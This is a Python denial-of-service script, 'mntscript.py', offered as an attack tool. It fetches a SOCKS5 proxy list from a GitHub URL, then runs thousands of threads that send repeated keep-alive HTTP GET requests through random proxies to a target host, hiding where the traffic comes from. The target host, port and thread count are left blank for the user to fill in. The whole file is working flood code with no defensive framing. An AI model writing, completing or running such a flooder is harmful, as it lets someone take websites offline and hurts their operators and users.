import os
import random
from random import randrange
from random import choice
from threading import Thread, active_count
from socks import socksocket, PROXY_TYPE_SOCKS5
from socket import IPPROTO_TCP, TCP_NODELAY
from urllib.request import urlopen
from ssl import create_default_context
from colored import fg, bg, attr

# global strings
line = "_________________________________________________\n"

#functions
def __Flooder__():
    while 1:
        try:
            proxy = choice(PROXIES).split(':')
            ipaddr, port = str(proxy[0]), int(proxy[1])
            s = socksocket()
            s.setproxy(PROXY_TYPE_SOCKS5, ipaddr, port)
            s.settimeout(1)
            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            s.connect((HOST, PORT))
            if PORT == 443:
                s = create_default_context().wrap_socket(s, server_hostname=HOST)
            for _ in range(200):
                s.send(PAYLOAD)
        except Exception:
            pass

def attack():
    while 1:
        if active_count() <= THREADS:
            T=Thread(target=__Flooder__)
            T.daemon = True
            T.start()

if __name__ == '__main__':
    # USERAGENTS
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/100useragentslist.py : 100 useragents(python list)
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/2kuseragents.txt : 2k useragents(non python list)
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/5kuseragents.txt : 5k useragents(non python list)
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/10kuseragents.txt : 10k useragents(non python list)
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/25kuseragents.txt : 25k useragents(non python list)
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/50kuseragents.txt : 50k useragents(non python list)

    # SETTINGS
    HOST = "" # please, enter url without http:// and https://
    PORT =  # 80 for http site, 443 for https site
    KEEPALIVE = 300 # connection alive
    SECONDS = -1 # thats a visual param
    THREADS =  # enter threads for range 1000-5000
    PAYLOAD = f'GET / HTTP/1.1\r\nHost: {HOST}\r\nKeep-Alive: {KEEPALIVE}\r\nConnection: keep-alive\r\n\r\n'.encode() # HEADERS
    PROXIES = urlopen('https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/bestprox.txt').read().decode().splitlines() # PROXIES  
    conc = THREADS / 1000 # thats a visual param
    
    # PROXIES
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/bestproxy4_socks5.txt : 364 proxies
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/bestproxy3_socks5.txt : 70 proxies
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/bestproxy2_socks5.txt : 39 proxies
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/bestproxy_socks5.txt : 444 proxies
    # https://raw.githubusercontent.com/tickydev/socks5-and-useragents/main/allproxy_socks5.txt : 6817 proxies
    
    print(f"{fg(99)}███╗░░░███╗███╗░░██╗████████╗\n████╗░████║████╗░██║╚══██╔══╝\n██╔████╔██║██╔██╗██║░░░██║░░░\n██║╚██╔╝██║██║╚████║░░░██║░░░\n██║░╚═╝░██║██║░╚███║░░░██║░░░\n╚═╝░░░░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░\n{attr(0)}") # logo
    print(f"{fg(54)}" + line + f"{attr(0)}")
    print(f"{fg(93)}root@mntscript > {attr(0)}", f"{fg(93)}[mntscript.py] prepared{attr(0)}", conc, f"{fg(93)}concurrents{attr(0)} (",THREADS,f"threads) {fg(93)}to host{attr(0)}", HOST, f"{fg(93)}with port{attr(0)}", PORT, f"{fg(93)}for{attr(0)}", SECONDS, f"{fg(93)}seconds{attr(0)}")
    print(f"{fg(93)}root@mntscript > {attr(0)}", f"{fg(93)}[mntscript.py] script by $t1cky.dev{attr(0)}")
    test = input(f"{fg(93)}root@mntscript >  {attr(0)}" + f"{fg(93)}[mntscript.py] *PRESS ANY KEY TO START SCRIPT* {attr(0)}")
    print(f"{fg(93)}root@mntscript > {attr(0)}", f"{fg(93)}[mntscript.py] sended{attr(0)}", conc, f"{fg(93)}concurrents to host{attr(0)}", HOST, f"{fg(93)}with port{attr(0)}", PORT, f"{fg(93)}for{attr(0)}", SECONDS, f"{fg(93)}seconds{attr(0)}")
    
    attack() # START FLOOD
